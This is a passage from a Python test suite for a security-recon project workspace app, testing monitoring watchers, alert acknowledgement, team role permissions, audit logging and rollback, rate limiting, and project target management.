                (f"ent_monitor_suppressed_{suffix}", session_id, "suppressed.darklab.sh", 1),
                (f"ent_monitor_foreign_{suffix}", other_session_id, "foreign.darklab.sh", 0),
            ):
                conn.execute(
                    "INSERT INTO entities "
                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, "
                    "occurrence_count, suppressed, created) "
                    "VALUES (?, ?, 'domain', ?, ?, ?, ?, 1, ?, ?)",
                    (entity_id, owner, value, f"sig_{entity_id}", now, now, suppressed, now),
                )
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'atlas_entity', ?, 'manual', ?)",
                    (f"plink_{entity_id}", project["id"], entity_id, now),
                )
            conn.commit()

        resp = client.get(
            f"/projects/{project['id']}/monitoring",
            headers={"X-Session-ID": session_id},
        )

        assert resp.status_code == 200
        payload = resp.get_json()
        assert payload["monitors"][0]["id"] == watcher.id
        assert payload["filter_options"]["targets"] == [{
            "id": visible_entity_id,
            "type": "domain",
            "value": "visible.darklab.sh",
        }]
        assert [target["value"] for target in payload["monitors"][0]["linked_targets"]] == ["visible.darklab.sh"]

    def test_project_monitoring_fire_ack_route_updates_fire_and_audits_metadata(self):
        from core.helpers import get_log_session_id
        from services.watchers import service as watcher_service

        client = get_client()
        session_id = "tok_project_monitoring_ack_" + uuid.uuid4().hex[:8]
        self._register_session_token(session_id)
        project = self._create_project(client, session_id, name="Monitoring Triage")
        run_id = self._seed_run(session_id, "nmap -sV darklab.sh")

        with db_connect() as conn:
            watcher = watcher_service.create_watcher(
                session_id,
                command_text="nmap -sV darklab.sh",
                project_id=project["id"],
                cadence_preset="hourly",
                conn=conn,
            )
            fire = watcher_service.record_watcher_fire(
                conn,
                watcher,
                run_id=run_id,
                diff_summary={"classifier": "ports", "added_port_count": 1},
                diff_kind="signal",
                state_at_fire="changed",
                state_reason="diff_detected",
                fire_kind="changed",
            )
            conn.commit()

        with mock.patch.object(project_routes.log, "info") as info_log:
            resp = client.patch(
                f"/projects/{project['id']}/monitoring/fires/{fire.id}",
                headers={"X-Session-ID": session_id},
                json={"ack_state": "expected", "ack_note": "Maintenance window"},
            )

        assert resp.status_code == 200
        payload = resp.get_json()
        assert payload["fire"]["ack_state"] == "expected"
        assert payload["fire"]["ack_note"] == "Maintenance window"
        assert payload["fire"]["ack_by"] == session_id
        assert payload["fire"]["ack_at"]
        audit_rows = _audit_event_rows(target_id=watcher.id, event_type="watcher.ack")
        assert len(audit_rows) == 1
        assert audit_rows[0]["project_id"] == project["id"]
        assert audit_rows[0]["details"]["fire_id"] == fire.id
        assert audit_rows[0]["details"]["ack_state"] == "expected"
        assert audit_rows[0]["details"]["note_chars"] == len("Maintenance window")
        assert "Maintenance window" not in json.dumps(audit_rows[0]["details"])
        updated_log = next(call for call in info_log.call_args_list if call.args == ("PROJECT_MONITORING_FIRE_ACK_UPDATED",))
        assert updated_log.kwargs["extra"] == {
            "ip": mock.ANY,
            "session": get_log_session_id(session_id),
            "team_id": "",
            "project_id": project["id"],
            "watcher_id": watcher.id,
            "fire_id": fire.id,
            "ack_state": "expected",
            "note_chars": len("Maintenance window"),
        }

        with mock.patch.object(project_routes.log, "warning") as warning_log:
            rejected = client.patch(
                f"/projects/{project['id']}/monitoring/fires/{fire.id}",
                headers={"X-Session-ID": session_id},
                json={"ack_state": "invalid"},
            )
        assert rejected.status_code == 400
        assert warning_log.call_args.args == ("PROJECT_MONITORING_FIRE_ACK_REJECTED",)
        assert warning_log.call_args.kwargs["extra"]["status"] == 400
        assert warning_log.call_args.kwargs["extra"]["fire_id"] == fire.id

        with mock.patch.object(project_routes.log, "debug") as debug_log:
            missing = client.patch(
                f"/projects/{project['id']}/monitoring/fires/missing-fire",
                headers={"X-Session-ID": session_id},
                json={"ack_state": "expected"},
            )
        assert missing.status_code == 404
        assert debug_log.call_args.args == ("PROJECT_MONITORING_FIRE_ACK_MISS",)
        assert debug_log.call_args.kwargs["extra"]["fire_id"] == "missing-fire"

    def test_project_monitoring_team_routes_enforce_view_and_triage_capabilities(self):
        from services.watchers import service as watcher_service

        client = get_client()
        owner_token = "tok_project_monitoring_team_owner_" + uuid.uuid4().hex[:8]
        viewer_token = "tok_project_monitoring_team_viewer_" + uuid.uuid4().hex[:8]
        operator_token = "tok_project_monitoring_team_operator_" + uuid.uuid4().hex[:8]
        outsider_token = "tok_project_monitoring_team_outsider_" + uuid.uuid4().hex[:8]
        team = self._create_team(client, owner_token, name="Monitoring Team")
        team_id = team["id"]
        self._join_team(
            client,
            owner_token,
            team_id,
            viewer_token,
            role="viewer",
            display_name="Monitoring Viewer",
        )
        operator_member = self._join_team(
            client,
            owner_token,
            team_id,
            operator_token,
            role="operator",
            display_name="Monitoring Operator",
        )
        self._register_session_token(outsider_token)
        project = self._create_project(
            client,
            owner_token,
            name="Team Monitoring",
            headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
        )
        viewer_headers = {"X-Session-ID": viewer_token, "X-Team-ID": team_id}
        operator_headers = {"X-Session-ID": operator_token, "X-Team-ID": team_id}
        outsider_headers = {"X-Session-ID": outsider_token, "X-Team-ID": team_id}
        suffix = uuid.uuid4().hex[:8]
        baseline_run_id = f"run_team_monitor_base_{suffix}"
        current_run_id = f"run_team_monitor_current_{suffix}"

        with db_connect() as conn:
            conn.execute(
                "INSERT INTO runs "
                "(id, session_id, team_id, run_kind, command, started, finished, exit_code, output_preview, output_line_count) "
                "VALUES (?, ?, ?, 'external', ?, ?, ?, 0, ?, 1)",
                (
                    baseline_run_id,
                    owner_token,
                    team_id,
                    "nmap -sV team.darklab.sh",
                    "2026-06-15T12:00:00+00:00",
                    "2026-06-15T12:00:01+00:00",
                    json.dumps(["80/tcp open http"]),
                ),
            )
            conn.execute(
                "INSERT INTO runs "
                "(id, session_id, team_id, run_kind, command, started, finished, exit_code, output_preview, output_line_count) "
                "VALUES (?, ?, ?, 'external', ?, ?, ?, 0, ?, 2)",
                (
                    current_run_id,
                    owner_token,
                    team_id,
                    "nmap -sV team.darklab.sh",
                    "2026-06-15T12:05:00+00:00",
                    "2026-06-15T12:05:01+00:00",
                    json.dumps(["80/tcp open http", "443/tcp open https"]),
                ),
            )
            watcher = watcher_service.create_watcher(
                owner_token,
                team_id=team_id,
                command_text="nmap -sV team.darklab.sh",
                baseline_run_id=baseline_run_id,
                project_id=project["id"],
                cadence_preset="hourly",
                conn=conn,
            )
            fire = watcher_service.record_watcher_fire(
                conn,
                watcher,
                run_id=current_run_id,
                diff_summary={
                    "classifier": "ports",
                    "added_port_count": 1,
                    "added_ports": [{"key": "443/tcp", "state": "open", "service": "https"}],
                },
                diff_kind="signal",
                state_at_fire="changed",
                state_reason="diff_detected",
                fire_kind="changed",
            )
            watcher_service.set_watcher_state(
                watcher.id,
                state="changed",
                state_reason="diff_detected",
                last_run_id=current_run_id,
                conn=conn,
            )
            conn.commit()

        view_resp = client.get(f"/projects/{project['id']}/monitoring", headers=viewer_headers)
        summary_resp = client.get(f"/projects/{project['id']}/monitoring/summary", headers=viewer_headers)
        outsider_resp = client.get(f"/projects/{project['id']}/monitoring", headers=outsider_headers)
        viewer_ack = client.patch(
            f"/projects/{project['id']}/monitoring/fires/{fire.id}",
            headers=viewer_headers,
            json={"ack_state": "expected", "ack_note": "Viewer note should be rejected"},
        )
        operator_ack = client.patch(
            f"/projects/{project['id']}/monitoring/fires/{fire.id}",
            headers=operator_headers,
            json={"ack_state": "expected", "ack_note": "Maintenance window"},
        )

        assert view_resp.status_code == 200
        assert view_resp.get_json()["monitors"][0]["id"] == watcher.id
        assert summary_resp.status_code == 200
        assert summary_resp.get_json()["summary"]["changed_monitor_count"] == 1
        assert outsider_resp.status_code == 403
        assert outsider_resp.get_json()["error"] == "team_forbidden"
        assert viewer_ack.status_code == 403
        assert viewer_ack.get_json()["error"] == "team_forbidden"
        assert operator_ack.status_code == 200
        assert operator_ack.get_json()["fire"]["ack_state"] == "expected"
        with db_connect() as conn:
            audit_row = conn.execute(
                "SELECT team_id, actor_member_id, actor_role, actor_display_name, details "
                "FROM audit_events WHERE event_type = 'watcher.ack' AND target_id = ?",
                (watcher.id,),
            ).fetchone()
        assert audit_row is not None
        assert audit_row["team_id"] == team_id
        assert audit_row["actor_member_id"] == operator_member["id"]
        assert audit_row["actor_role"] == "operator"
        assert audit_row["actor_display_name"] == "Monitoring Operator"
        audit_details = json.loads(audit_row["details"] or "{}")
        assert audit_details["fire_id"] == fire.id
        assert audit_details["ack_state"] == "expected"
        assert audit_details["note_chars"] == len("Maintenance window")
        assert "Maintenance window" not in json.dumps(audit_details)

    def test_project_digest_settings_routes_expose_channels_and_enforce_team_manage_roles(self, tmp_path):
        db_path = str(tmp_path / "project-digest-routes.db")
        lock_path = str(tmp_path / "project-digest-routes.lock")
        patchers = [
            mock.patch("core.database.DB_PATH", db_path),
            mock.patch("core.database.DB_INIT_LOCK_PATH", lock_path),
        ]
        for patcher in patchers:
            patcher.start()
        db_init()
        client = get_client()
        owner_token = "tok_project_digest_owner_" + uuid.uuid4().hex[:8]
        viewer_token = "tok_project_digest_viewer_" + uuid.uuid4().hex[:8]
        operator_token = "tok_project_digest_operator_" + uuid.uuid4().hex[:8]
        try:
            team = self._create_team(client, owner_token, name="Digest Settings Team")
            team_id = team["id"]
            self._join_team(
                client,
                owner_token,
                team_id,
                viewer_token,
                role="viewer",
                display_name="Digest Viewer",
            )
            self._join_team(
                client,
                owner_token,
                team_id,
                operator_token,
                role="operator",
                display_name="Digest Operator",
            )
            project = self._create_project(
                client,
                owner_token,
                name="Digest Settings",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
            )
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO notification_channels "
                    "(id, session_token, team_id, kind, label, secrets_json, config_json, triggers_json, "
                    "muted, created, updated) "
                    "VALUES ('ntc_digest_route', ?, ?, 'webhook', 'Digest route', '{}', '{}', '[]', 0, "
                    "'2026-06-15T10:00:00+00:00', '2026-06-15T10:00:00+00:00')",
                    (owner_token, team_id),
                )
                conn.commit()

            viewer_headers = {"X-Session-ID": viewer_token, "X-Team-ID": team_id}
            owner_headers = {"X-Session-ID": owner_token, "X-Team-ID": team_id}
            operator_headers = {"X-Session-ID": operator_token, "X-Team-ID": team_id}
            route = f"/projects/{project['id']}/digest-settings"
            viewer_get = client.get(route, headers=viewer_headers)
            viewer_patch = client.patch(
                route,
                headers=viewer_headers,
                json={
                    "enabled": True,
                    "cadence_preset": "daily",
                    "channel_ids": ["ntc_digest_route"],
                },
            )
            operator_patch = client.patch(
                route,
                headers=operator_headers,
                json={
                    "enabled": True,
                    "cadence_preset": "weekly",
                    "channel_ids": ["ntc_digest_route"],
                    "quiet_no_change": True,
                },
            )
            owner_get_after_operator_patch = client.get(route, headers=owner_headers)
            owner_patch = client.patch(
                route,
                headers=owner_headers,
                json={
                    "enabled": True,
                    "cadence_preset": "daily",
                    "channel_ids": ["ntc_digest_route"],
                    "quiet_no_change": False,
                },
            )
            operator_get = client.get(route, headers=operator_headers)
            monitoring_get = client.get(f"/projects/{project['id']}/monitoring", headers=operator_headers)
            with db_connect() as conn:
                digest_schedules = conn.execute(
                    "SELECT session_token, cadence_preset FROM schedules "
                    "WHERE owner_kind = 'project_digest' AND owner_id = ? AND team_id = ?",
                    (project["id"], team_id),
                ).fetchall()

            assert viewer_get.status_code == 200
            assert viewer_get.get_json()["can_manage_digest_settings"] is False
            assert viewer_get.get_json()["digest_settings"]["enabled"] is False
            assert viewer_get.get_json()["notification_channels"][0]["id"] == "ntc_digest_route"
            assert viewer_patch.status_code == 403
            assert viewer_patch.get_json()["error"] == "team_forbidden"
            assert operator_patch.status_code == 200
            operator_payload = operator_patch.get_json()
            assert operator_payload["can_manage_digest_settings"] is True
            assert operator_payload["digest_settings"]["enabled"] is True
            assert operator_payload["digest_settings"]["cadence_preset"] == "weekly"
            assert operator_payload["digest_settings"]["channel_ids"] == ["ntc_digest_route"]
            assert operator_payload["digest_settings"]["quiet_no_change"] is True
            assert operator_payload["digest_settings"]["session_id"] == owner_token
            assert owner_get_after_operator_patch.status_code == 200
            assert owner_get_after_operator_patch.get_json()["digest_settings"]["enabled"] is True
            assert owner_get_after_operator_patch.get_json()["digest_settings"]["cadence_preset"] == "weekly"
            assert owner_patch.status_code == 200
            assert owner_patch.get_json()["digest_settings"]["cadence_preset"] == "daily"
            assert operator_get.status_code == 200
            assert operator_get.get_json()["digest_settings"]["enabled"] is True
            assert operator_get.get_json()["digest_settings"]["cadence_preset"] == "daily"
            assert monitoring_get.status_code == 200
            assert monitoring_get.get_json()["digest_settings"]["cadence_preset"] == "daily"
            assert monitoring_get.get_json()["can_manage_digest_settings"] is True
            assert [(row["session_token"], row["cadence_preset"]) for row in digest_schedules] == [
                (owner_token, "daily")
            ]
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_project_activity_route_allows_team_viewer_for_team_project_only(self):
        from services.audit.models import AuditEventType
        from services.audit.recorder import record_event

        client = get_client()
        owner_token = "tok_project_activity_owner_" + uuid.uuid4().hex[:8]
        viewer_token = "tok_project_activity_viewer_" + uuid.uuid4().hex[:8]
        team = self._create_team(client, owner_token)
        team_id = team["id"]
        viewer_member = self._join_team(
            client,
            owner_token,
            team_id,
            viewer_token,
            role="viewer",
            display_name="Project Viewer",
        )
        team_project = self._create_project(
            client,
            owner_token,
            name="Team Scoped Activity",
            headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
        )
        foreign = self._create_project(client, "foreign-activity-owner", name="Foreign Activity Case")

        with db_connect() as conn:
            record_event(
                AuditEventType.PROJECT_LINK,
                session_id=owner_token,
                team_id=team_id,
                actor_member_id=viewer_member["id"],
                actor_role="viewer",
                actor_display_name="Project Viewer",
                target_id=team_project["id"],
                project_id=team_project["id"],
                details={"source": "test"},
                conn=conn,
                cfg={"audit_log_enabled": True},
                created="2026-06-06T12:00:00+00:00",
            )
            conn.commit()

        ok = client.get(
            f"/projects/{team_project['id']}/activity",
            headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
        )
        assert ok.status_code == 200
        payload = ok.get_json()
        assert [event["target"]["id"] for event in payload["events"]] == [team_project["id"]]
        assert payload["events"][0]["actor"] == {
            "display_name": "Project Viewer",
            "member_id": viewer_member["id"],
            "role": "viewer",
        }

        denied = client.get(
            f"/projects/{foreign['id']}/activity",
            headers={"X-Session-ID": viewer_token, "X-Team-ID": team_id},
        )
        assert denied.status_code == 404

    def test_project_delete_rolls_back_when_fail_closed_audit_fails(self):
        from services.audit.recorder import AuditRecordError

        client = get_client()
        session_id = self._session_id("project-delete-audit-failure")
        project = self._create_project(client, session_id, name="Audit Delete Rollback")

        with mock.patch.object(
            project_routes,
            "record_event",
            side_effect=AuditRecordError("audit unavailable"),
        ), pytest.raises(AuditRecordError):
            client.delete(
                f"/projects/{project['id']}",
                headers={"X-Session-ID": session_id},
            )

        still_present = client.get(
            f"/projects/{project['id']}",
            headers={"X-Session-ID": session_id},
        )
        assert still_present.status_code == 200
        assert json.loads(still_present.data)["project"]["id"] == project["id"]
        assert _audit_event_rows(target_id=project["id"], event_type="project.delete") == []

    def test_package_delete_rolls_back_when_fail_closed_audit_fails(self):
        from services.audit.recorder import AuditRecordError

        client = get_client()
        session_id = self._session_id("package-delete-audit-failure")
        project = self._create_project(client, session_id, name="Audit Package Rollback")
        package_resp = client.post(
            f"/projects/{project['id']}/packages",
            json={"name": "Rollback package", "redaction_mode": "redacted"},
            headers={"X-Session-ID": session_id},
        )
        assert package_resp.status_code == 201
        package = json.loads(package_resp.data)["package"]

        with mock.patch.object(
            project_routes,
            "record_event",
            side_effect=AuditRecordError("audit unavailable"),
        ), pytest.raises(AuditRecordError):
            client.delete(
                f"/projects/{project['id']}/packages/{package['id']}",
                headers={"X-Session-ID": session_id},
            )

        still_present = client.get(
            f"/projects/{project['id']}/packages/{package['id']}",
            headers={"X-Session-ID": session_id},
        )
        assert still_present.status_code == 200
        assert json.loads(still_present.data)["package"]["id"] == package["id"]
        assert _audit_event_rows(target_id=package["id"], event_type="package.delete") == []

    def _seed_run_entities(self, session_id, run_id):
        with db_connect() as conn:
            recorded = materialize_run_entities(
                conn,
                session_id,
                run_id,
                [{
                    "text": "darklab.sh 104.21.4.35",
                    "entities": [
                        {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
                        {"type": "ip", "value": "104.21.4.35", "canonical_value": "104.21.4.35"},
                    ],
                }],
                seen_at="2026-05-14T00:00:01+00:00",
            )
            conn.commit()
        return recorded

    def _project_compare_url(self, project_id, *, left=None, right=None, baseline_label=None):
        params = {"project_id": project_id}
        if left is not None:
            params["left"] = left
        if right is not None:
            params["right"] = right
        if baseline_label is not None:
            params["baseline_label"] = baseline_label
        return f"/history/compare?{urlencode(params)}"

    def test_project_host_target_ip_is_stored_as_ip_entity(self):
        client = get_client()
        session_id = self._session_id("project-host-ip")
        project = self._create_project(client, session_id)

        resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "host", "value": "192.0.2.10"},
            headers={"X-Session-ID": session_id},
        )
        target = json.loads(resp.data)["target"]

        assert resp.status_code == 201
        assert target["type"] == "ip"
        assert target["value"] == "192.0.2.10"

    def test_project_targets_list_supports_pagination_type_search_and_auto_filter(self):
        client = get_client()
        session_id = self._session_id("project-target-page")
        project = self._create_project(client, session_id)
        targets = []
        for payload in (
            {"type": "domain", "value": "darklab.sh"},
            {"type": "domain", "value": "example.org"},
            {"type": "ip", "value": "192.0.2.10"},
            {"type": "url", "value": "https://darklab.sh/login"},
        ):
            resp = client.post(
                f"/projects/{project['id']}/targets",
                json=payload,
                headers={"X-Session-ID": session_id},
            )
            assert resp.status_code == 201
            targets.append(json.loads(resp.data)["target"])
        with db_connect() as conn:
            conn.execute(
                "UPDATE project_links SET source = 'auto_command', review_state = 'pending' "
                "WHERE project_id = ? AND entity_type = 'atlas_entity' AND entity_id = ?",
                (project["id"], targets[2]["id"]),
            )
            conn.commit()

        domain_page = json.loads(client.get(
            f"/projects/{project['id']}/targets?type=domain&limit=1",
            headers={"X-Session-ID": session_id},
        ).data)
        search_page = json.loads(client.get(
            f"/projects/{project['id']}/targets?q=login",
            headers={"X-Session-ID": session_id},
        ).data)
        auto_page = json.loads(client.get(
            f"/projects/{project['id']}/targets?auto_discovered=1",
            headers={"X-Session-ID": session_id},
        ).data)

        assert domain_page["total"] == 2
        assert domain_page["limit"] == 1
        assert len(domain_page["targets"]) == 1
        assert domain_page["counts_by_type"] == {"domain": 2, "ip": 1, "url": 1}
        assert [item["value"] for item in search_page["targets"]] == ["https://darklab.sh/login"]
        assert [item["id"] for item in auto_page["targets"]] == [targets[2]["id"]]
        assert auto_page["targets"][0]["review_state"] == "pending"

    def test_builtin_runs_do_not_record_findings_even_with_legacy_project_link(self):
        client = get_client()
        session_id = self._session_id("builtin-findings")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "history", run_kind="builtin")
        target = json.loads(client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "host", "value": "darklab.sh"},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                "VALUES (?, ?, 'run', ?, 'manual', datetime('now'))",
                ("plink_" + uuid.uuid4().hex, project["id"], run_id),
            )
            recorded = record_run_findings(
                conn,
                session_id,
                run_id,
                [{"text": "darklab.sh exposed service", "signals": ["findings"]}],
            )
            finding_count = conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ? AND run_id = ?",
                (session_id, run_id),
            ).fetchone()[0]
            conn.execute("DELETE FROM project_links WHERE entity_id = ?", (run_id,))
            conn.execute(
                "DELETE FROM project_links WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (target["id"],),
            )
            conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
            conn.execute("DELETE FROM projects WHERE id = ?", (project["id"],))
            conn.commit()
        assert recorded == []
        assert finding_count == 0

    def test_project_write_routes_are_rate_limited(self):
        for view in (
            project_routes.projects_create,
            project_routes.projects_active_set,
            project_routes.projects_active_clear,
            project_routes.projects_update,
            project_routes.projects_delete,
            project_routes.projects_links_create,
            project_routes.projects_links_delete,
            project_routes.projects_targets_create,
            project_routes.projects_targets_update,
            project_routes.projects_targets_delete,
            project_routes.projects_packages_create,
            project_routes.projects_packages_delete,
            project_routes.findings_review_update,
            project_routes.entity_labels_create,
            project_routes.entity_labels_delete,
            project_routes.entity_note_update,
            project_routes.entity_note_delete,
        ):
            assert "__wrapper-limiter-instance" in view.__dict__
        assert "__wrapper-limiter-instance" in project_routes.projects_packages_download.__dict__
        assert "__wrapper-limiter-instance" in project_routes.projects_auto_promote_rules_preview.__dict__

    def test_dynamic_unknown_routes_use_baseline_http_rate_limit(self, monkeypatch):
        client = get_client()
        remote_addr = f"2001:db8::{uuid.uuid4().hex[:16]}"
        probe_path = f"/nuclei-probe-{uuid.uuid4().hex}"
        monkeypatch.setitem(shell_app.CFG, "http_rate_limit_per_minute", 1)
        monkeypatch.setitem(shell_app.CFG, "http_rate_limit_per_second", 1)

        first = client.get(
            probe_path,
            environ_base={"REMOTE_ADDR": remote_addr},
        )
        second = client.get(
            probe_path,
            environ_base={"REMOTE_ADDR": remote_addr},
        )

        assert first.status_code == 404
        assert second.status_code == 429
        assert json.loads(second.data)["error"] == "rate_limited"

    def test_default_baseline_http_rate_limit_allows_page_load_burst(self):
        client = get_client()
        remote_addr = f"2001:db8::{uuid.uuid4().hex[:16]}"
        probe_prefix = f"/bootstrap-probe-{uuid.uuid4().hex}"

        responses = [
            client.get(
                f"{probe_prefix}-{idx}",
                environ_base={"REMOTE_ADDR": remote_addr},
            )
            for idx in range(60)
        ]

        assert [resp.status_code for resp in responses] == [404] * 60

    def test_static_assets_skip_baseline_http_rate_limit(self, monkeypatch):
        client = get_client()
        remote_addr = f"2001:db8::{uuid.uuid4().hex[:16]}"
        monkeypatch.setitem(shell_app.CFG, "http_rate_limit_per_minute", 1)
        monkeypatch.setitem(shell_app.CFG, "http_rate_limit_per_second", 1)

        first = client.get(
            "/static/js/app.js",
            environ_base={"REMOTE_ADDR": remote_addr},
        )
        second = client.get(
            "/static/js/app.js",
            environ_base={"REMOTE_ADDR": remote_addr},
        )

        assert first.status_code == 200
        assert second.status_code == 200
        assert first.headers.get("Cache-Control") == "public, max-age=31536000, immutable"

    def test_create_list_get_update_archive_and_delete_project(self):
        client = get_client()
        session_id = self._session_id()
        project = self._create_project(client, session_id)

        assert project["name"] == "External Review"
        assert project["slug"] == "external-review"
        assert project["status"] == "active"

        listed = json.loads(client.get("/projects", headers={"X-Session-ID": session_id}).data)
        assert [item["id"] for item in listed["projects"]] == [project["id"]]

        get_resp = client.get(f"/projects/{project['id']}", headers={"X-Session-ID": session_id})
        assert json.loads(get_resp.data)["project"]["description"] == "Quarterly case folder"

        project_label = client.post(
            f"/entities/project/{project['id']}/labels",
            json={"label": "important"},
            headers={"X-Session-ID": session_id},
        )
        assert project_label.status_code == 201
        labeled_list = json.loads(client.get("/projects", headers={"X-Session-ID": session_id}).data)
        assert [label["label"] for label in labeled_list["projects"][0]["labels"]] == ["important"]
        paged_list = json.loads(client.get(
            "/projects?include_archived=1&include_counts=1&limit=1&offset=0",
            headers={"X-Session-ID": session_id},
        ).data)
        assert paged_list["total"] == 1
        assert paged_list["limit"] == 1
        assert paged_list["offset"] == 0
        assert paged_list["projects"][0]["counts"]["runs"] == 0
        assert [label["label"] for label in paged_list["projects"][0]["labels"]] == ["important"]
        labeled_get = json.loads(client.get(
            f"/projects/{project['id']}",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [label["label"] for label in labeled_get["project"]["labels"]] == ["important"]
        labeled_summary = json.loads(client.get(
            f"/projects/{project['id']}/summary",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [label["label"] for label in labeled_summary["project"]["labels"]] == ["important"]

        target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "darklab.sh"},
            headers={"X-Session-ID": session_id},
        )
        duplicate_target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "darklab.sh"},
            headers={"X-Session-ID": session_id},
        )
        invalid_target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "unsupported", "value": "darklab.sh"},
            headers={"X-Session-ID": session_id},
        )
        assert target_resp.status_code == 201
        assert duplicate_target_resp.status_code == 201
        assert invalid_target_resp.status_code == 400
        target = json.loads(target_resp.data)["target"]
        assert json.loads(duplicate_target_resp.data)["target"]["id"] == target["id"]
        assert target["value"] == "darklab.sh"
        assert target["confidence"] == 1.0
        assert target["review_state"] == "confirmed"
        assert target["source"] == "user"
        assert target["source_detail"] == {}
        assert target["seen_count"] == 1
        assert target["dismissed_at"] == ""

        updated_target = json.loads(client.put(
            f"/projects/{project['id']}/targets/{target['id']}",
            json={"confidence": 0.8},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        assert updated_target["confidence"] == 0.8
        target_label = client.post(
            f"/entities/target/{target['id']}/labels",
            json={"label": "Primary web domain"},
            headers={"X-Session-ID": session_id},
        )
        target_note = client.put(
            f"/entities/target/{target['id']}/note",
            json={"body": "Scope approved"},
            headers={"X-Session-ID": session_id},
        )
        assert target_label.status_code == 201
        assert target_note.status_code == 200
        targets = json.loads(client.get(
            f"/projects/{project['id']}/targets",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["id"] for item in targets["targets"]] == [target["id"]]
        assert [item["label"] for item in targets["targets"][0]["labels"]] == ["Primary web domain"]
        assert targets["targets"][0]["note"]["body"] == "Scope approved"
        fallback_target = json.loads(client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "host", "value": "api.darklab.sh"},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        with sqlite3.connect(DB_PATH) as conn:
            finding_id = "fnd_target_delete_" + uuid.uuid4().hex
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, target_id, scope, raw_line, created) "
                "VALUES (?, ?, 'run_target_delete', ?, 'finding', 'target finding', datetime('now'))",
                (finding_id, session_id, target["id"]),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'finding', ?, 'finding-kept', datetime('now'))",
                ("lbl_finding_target_delete_" + uuid.uuid4().hex, session_id, finding_id),
            )
            conn.commit()
        hidden_targets = client.get(
            f"/projects/{project['id']}/targets",
            headers={"X-Session-ID": "other-session"},
        )
        assert hidden_targets.status_code == 404
        delete_target_resp = client.delete(
            f"/projects/{project['id']}/targets/{target['id']}",
            headers={"X-Session-ID": session_id},
        )
        assert delete_target_resp.status_code == 200
        targets_after_delete = json.loads(client.get(
            f"/projects/{project['id']}/targets",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["id"] for item in targets_after_delete["targets"]] == [fallback_target["id"]]
        with sqlite3.connect(DB_PATH) as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM entity_labels WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (target["id"],),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM entity_notes WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (target["id"],),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM project_links WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (target["id"],),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM project_links WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (fallback_target["id"],),
            ).fetchone()[0] == 1
            assert conn.execute(
                "SELECT COUNT(*) FROM entity_labels "
                "WHERE session_id = ? AND entity_type = 'finding' AND label = 'finding-kept'",
                (session_id,),
            ).fetchone()[0] == 1
            assert conn.execute(
                "SELECT COUNT(*) FROM findings "
                "WHERE session_id = ? AND run_id = 'run_target_delete' AND target_id = ?",
                (session_id, target["id"]),
            ).fetchone()[0] == 1

        update_resp = client.put(
            f"/projects/{project['id']}",
            json={"name": "Renamed Review", "status": "archived", "notes": "private notes"},
            headers={"X-Session-ID": session_id},
        )
        assert update_resp.status_code == 200
        updated = json.loads(update_resp.data)["project"]
        assert updated["name"] == "Renamed Review"
        assert updated["slug"] == "renamed-review"
        assert updated["status"] == "archived"
        assert updated["note"]["body"] == "private notes"
        with sqlite3.connect(DB_PATH) as conn:
            assert conn.execute(
                "SELECT body FROM entity_notes "
                "WHERE session_id = ? AND entity_type = 'project' AND entity_id = ?",
                (session_id, project["id"]),
            ).fetchone()[0] == "private notes"

        default_list = json.loads(client.get("/projects", headers={"X-Session-ID": session_id}).data)
        assert default_list["projects"] == []
        archived_list = json.loads(
            client.get("/projects?include_archived=1", headers={"X-Session-ID": session_id}).data
        )
        assert [item["id"] for item in archived_list["projects"]] == [project["id"]]

        unarchive_resp = client.put(
            f"/projects/{project['id']}",
            json={"status": "active"},
            headers={"X-Session-ID": session_id},
        )
        assert unarchive_resp.status_code == 200
        unarchived = json.loads(unarchive_resp.data)["project"]
        assert unarchived["status"] == "active"
        default_list_after_unarchive = json.loads(client.get("/projects", headers={"X-Session-ID": session_id}).data)
        assert [item["id"] for item in default_list_after_unarchive["projects"]] == [project["id"]]

        cleanup_target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "cleanup.darklab.sh"},
            headers={"X-Session-ID": session_id},
        )
        assert cleanup_target_resp.status_code == 201
        cleanup_target = json.loads(cleanup_target_resp.data)["target"]
        with sqlite3.connect(DB_PATH) as conn:
            rule_id = "apr_project_delete_" + uuid.uuid4().hex[:16]
            conn.execute(
                "INSERT INTO project_auto_promote_rules "
